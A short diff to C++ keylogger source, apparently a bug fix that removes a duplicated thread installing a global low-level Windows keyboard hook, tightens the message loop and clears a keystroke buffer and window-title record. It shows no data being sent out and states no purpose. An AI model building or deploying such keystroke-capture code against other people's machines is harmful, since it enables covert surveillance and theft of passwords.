@@ -74,31 +74,19 @@ bool KeyloggerEngine::init() {
         }
 
         MSG msg;
-        while (GetMessageW(&msg, NULL, 0, 0)) {
+        while (GetMessageW(&msg, NULL, 0, 0) > 0) {
             TranslateMessage(&msg);
             DispatchMessageW(&msg);
         }
 
-        (void) UnhookWindowsHookEx(keyloggerHook);
-        keyloggerHook = nullptr;
-    }).detach();
-    std::thread([this]() {
-        hookThreadId = GetCurrentThreadId();
-        keyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, ::HookCallback, NULL, 0);
-        if (!keyloggerHook) {
-            std::cerr << "Hook failed\n";
-            return;
+        if (keyloggerHook) {
+            UnhookWindowsHookEx(keyloggerHook);
+            keyloggerHook = nullptr;
         }
-
-        MSG msg;
-        while (GetMessageW(&msg, NULL, 0, 0)) {
-            TranslateMessage(&msg);
-            DispatchMessageW(&msg);
-        }
-
-        (void) UnhookWindowsHookEx(keyloggerHook);
-        keyloggerHook = nullptr;
     }).detach();
+
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+
     std::lock_guard<std::mutex> lock(bufferLock);
     buffer.clear();
     lastWindowTitle.clear();
